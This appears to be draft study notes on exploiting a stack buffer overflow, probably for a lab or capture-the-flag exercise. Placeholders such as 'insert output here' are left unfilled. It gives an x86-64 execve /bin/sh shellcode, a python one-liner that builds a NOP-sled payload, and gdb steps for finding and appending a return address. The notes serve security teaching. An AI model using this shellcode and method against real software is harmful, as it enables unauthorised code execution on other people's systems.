

# Buffer overflows


First, take the time to understand the program. Using tools such as gdb, readelf, and objdump will help gain a better understanding of what the program is doing.

insert bof4 here

Big or little endian?:
```bash
readelf -h <path/to/binary>
```
This will tell you in what order the shellcode should be created, later injecting to change the behavior of the program.


The shellcode length (in bytes) must fit into to buffer that is allowing this exploit to occur. To account for the buffer size, find the length of the shellcode, sbutract it from the buffer size:

```python
buffersize = 154 - 6 #default value plus null termination
shellcode = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
print(buffersize - len(shellcode))
```

Using this available size, fill in the difference with `nops` that will be used as a point of insertion for the payload.

Let's have a look at any calls and moves involving source and destination registersusing gdb.

```bash
insert disas
pay attention to the lines: mov -0xa8(%rbp, %rdx)
                            mov -0xa0(%rbp, %rax)
x/s $rbp - 168
x/s $rbp - 160 # this should be the default value seen in the function
```

We should see if we are able to reach into this memory location by injecting some values:


python -c "print('\x90' * 100 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + 'A' * 10 + 'B' * 14)"


While we are unable to view rbp, we do have access to the stack. From here, we should be able to see our `nops`, shellcode, and added characters.

```bash
x/100x $rsp - 168

insert output here

use the address seen after the shellcode, remembering its endianness
0x7f ff ff ff e9 70
```
Using this address, add it after the shellcode.
